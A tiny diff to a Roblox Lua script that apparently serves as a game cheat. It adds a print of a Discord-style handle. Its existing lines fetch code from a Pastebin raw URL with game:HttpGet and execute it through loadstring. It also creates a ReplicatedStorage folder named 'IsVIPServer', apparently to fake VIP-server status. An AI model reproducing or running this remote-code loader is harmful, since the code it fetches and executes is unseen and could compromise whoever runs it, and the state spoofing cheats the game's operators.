@@ -1,3 +1,5 @@
+print('Arson#2876')
+
 loadstring(game:HttpGet("https://pastebin.com/raw/KyTEgYcj"))()
 
 Instance.new("Folder", game:GetService("ReplicatedStorage")).Name = "IsVIPServer"
